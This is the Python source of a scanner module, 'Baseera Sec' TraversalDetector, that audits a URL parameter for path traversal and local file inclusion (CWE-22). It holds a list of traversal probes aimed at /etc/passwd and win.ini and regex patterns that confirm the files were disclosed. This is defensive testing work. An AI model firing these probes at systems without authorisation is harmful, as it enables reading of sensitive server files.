"""
Baseera Sec - Path Traversal & LFI Verification Engine
Audits parameters for Directory Traversal and Arbitrary File Reads (CWE-22).
Verifies actual content exposure (e.g. /etc/passwd entries or win.ini sections)
while discarding verbatim parameter echo reflections.
"""
import re
import time
import httpx
from typing import Dict, Any, List, Optional
from urllib.parse import urlencode, parse_qsl, urlsplit, urlunsplit


class TraversalDetector:
    PROBES = [
        ("../../../../etc/passwd", "Standard UNIX Path Traversal"),
        ("..%2f..%2f..%2f..%2fetc%2fpasswd", "URL-encoded Path Traversal"),
        ("..\\..\\..\\..\\windows\\win.ini", "Windows Path Traversal"),
        ("/etc/passwd", "Direct Absolute Path File Access")
    ]

    PATTERNS = [
        (r"root:.*:0:0:", "UNIX /etc/passwd root account entry"),
        (r"daemon:.*:1:1:", "UNIX /etc/passwd daemon entry"),
        (r"\[fonts\]|\[extensions\]", "Windows win.ini header"),
        (r"\[boot loader\]", "Windows boot.ini header")
    ]

    @classmethod
    async def audit_parameter(
        cls,
        target_url: str,
        param_name: str,
        current_val: str,
        method: str,
        client: httpx.AsyncClient
    ) -> Optional[Dict[str, Any]]:
        parsed = urlsplit(target_url)
        base_endpoint = urlunsplit((parsed.scheme, parsed.netloc, parsed.path or "/", "", ""))
        orig_params = dict(parse_qsl(parsed.query, keep_blank_values=True))
        if not orig_params and param_name:
            orig_params[param_name] = current_val or "index.html"

        try:
            r_base = await client.request(method, target_url, timeout=5.0, follow_redirects=True)
            base_text = r_base.text
        except (httpx.TimeoutException, httpx.ConnectError):
            return {"is_vulnerable": False, "is_timeout": True, "error": "Network timeout"}
        except Exception:
            base_text = ""

        for probe_payload, probe_desc in cls.PROBES:
            test_params = orig_params.copy()
            test_params[param_name] = probe_payload

            try:
                t0 = time.perf_counter()
                if method.upper() == "POST":
                    resp = await client.post(base_endpoint, data=test_params, timeout=5.0, follow_redirects=True)
                else:
                    test_url = f"{base_endpoint}?{urlencode(test_params)}"
                    resp = await client.get(test_url, timeout=5.0, follow_redirects=True)
                lat_ms = round((time.perf_counter() - t0) * 1000, 2)

                if resp.status_code == 200:
                    resp_text = resp.text

                    # Discard cases where the response is simply reflecting the probe path in an error or form
                    clean_resp = resp_text.replace(probe_payload, "")

                    for regex_pattern, pattern_desc in cls.PATTERNS:
                        if re.search(regex_pattern, clean_resp) and not re.search(regex_pattern, base_text):
                            return {
                                "is_vulnerable": True,
                                "type": "Path Traversal & Arbitrary File Read (CWE-22)",
                                "severity": "HIGH",
                                "param_name": param_name,
                                "payload": probe_payload,
                                "http_code": resp.status_code,
                                "latency_ms": lat_ms,
                                "evidence": f"Sensitive system file disclosed: detected '{pattern_desc}'.",
                                "raw_request": f"{method} {base_endpoint} with {param_name}={test_params[param_name]}",
                                "raw_response": resp.text[:300].strip(),
                                "remediation": "Validate path parameters against an explicit allowlist, use os.path.basename, and reject any path components containing '../'."
                            }
            except Exception:
                continue

        return None
